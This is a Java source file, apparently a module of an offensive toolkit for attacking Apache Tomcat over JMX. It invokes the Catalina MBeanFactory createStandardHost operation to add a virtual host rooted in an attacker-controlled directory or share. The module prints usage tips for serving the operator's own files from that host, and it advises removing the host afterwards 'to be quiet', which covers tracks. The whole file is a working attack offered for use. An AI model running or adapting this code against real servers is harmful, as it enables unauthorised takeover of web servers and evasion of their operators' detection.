package jmxattacks;



import javax.management.ObjectName;
import jmxmenus.MainMenu;
import jmxutils.EasyBasicParser;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.OptionBuilder;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.apache.commons.cli.Parser;

public class CreateHost extends Attack {


	String description = "This attack will create a new host on the server you can choose the application root directory... Why not an open share ?";
	String name = "CreateHost";
	String banner = "Please enter options for this module or back to return to the main menu";
	String example = "--path \\\\myshare\\share\\ (or a directory controlled by yourself) --name hostname";
	private static String mbean = "Catalina:type=MBeanFactory";
	private static String operation ="createStandardHost";
	private ObjectName object ;
	private String path;
	private String host;
	private Object retour;
	
	public CreateHost()
	{	
		this.setAttack_description(description);
		this.setAttack_name(name);	
	}
	
	public void prepareExploit(String arg)
	{
		this.setAttack_description(description);
		this.setAttack_name(name);	
		this.object = createObject(this.mbean);
		if (this.object != null)
		{
			Parser parser = new EasyBasicParser();
			CommandLine line = null;
			try {
				line = parser.parse( this.setArgs(), StringtoArrayList(arg));
			} catch (ParseException e) {
				System.err.println( "Parsing failed.  Reason: " + e.getMessage() );
				System.exit(-1);
			}
			if (line != null)
			{
			this.path = line.getOptionValue("path");
		    this.host = line.getOptionValue("name");
		    this.exploit();
			}
		}
	}
		
	private Options setArgs()
	{
		Options options = new Options();
		options.addOption("h", "help", true, "prints the help content");
		   options.addOption(OptionBuilder
			       .withArgName("path")
			       .withLongOpt("path")
			       .hasArg()
			       .isRequired()
			       .withDescription("fullpath to root directory")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("name")
			       .withLongOpt("name")
			       .hasArg()
			       .isRequired()
			       .withDescription("name of your host")
			       .create());
		   
		   return options;
	}
	
	private void exploit()
	{
		// Prepare createStandardHost invocation
		Object retour;
        Object[] a = new Object[7];
        a[0] = "Catalina:type=Host";
        a[1] = this.host;
        a[2] = this.path;
        a[3] = true;
        a[4] = true;
        a[5] = true;
        a[6] = true;
        String[] b = new String[7];
        b[0] = "java.lang.String";
        b[1]="java.lang.String";
        b[2]= "java.lang.String";
        b[3] = "boolean";
        b[4] = "boolean";
        b[5] = "boolean";
        b[6] = "boolean";
   // Invoke createStandardHost
		this.setRetour(invoke(this.object, this.operation,a, b));
		
		
	}
	
	public void prepareExploit() {
		
		System.out.println(this.name+" exploit selected");
		this.object = createObject(this.mbean);
		if (this.object != null)
		{ 
			// Display Menu to retrieve options			
			CommandLine line = attackMenu(this.setArgs(),this.banner,this.example);
			if (line != null)
			{
			    this.path = line.getOptionValue("path");
			    this.host = line.getOptionValue("name");
			    System.out.println("#### " +this.operation+ " operation will be invoke ####");
			    this.exploit();
			    
			    System.out.println("\nIf the operation succeded you should be able to access files in hostname root directory\nDon't forget to use your new hostname in requests headers\nIf you control the hostame root directory reminded that the server will deserve automatically files present in ROOT directory otherwise put yours files in other directory\nFor example:\nyour root directory is /tmp/test => put files in /tmp/test/app/ =>access http://yourhost/app/yourfile\nTo be quiet don't forget to remove your host after using it (RemoveHost)\n");
				try {
					Thread.sleep(2000);
				} catch (InterruptedException e) {
					System.out.println(e.getMessage());	
				}
			}
			
		}
		else
		{
			System.out.println("Error the object cannot be instanciated. Does the operation " + this.operation + " is available on " + this.mbean + " ?\nReturn to the main menu \n");
		}
			MainMenu menu = new MainMenu();
			
	}

	public Object getRetour() {
		return retour;
	}

	public void setRetour(Object retour) {
		this.retour = retour;
	}
}
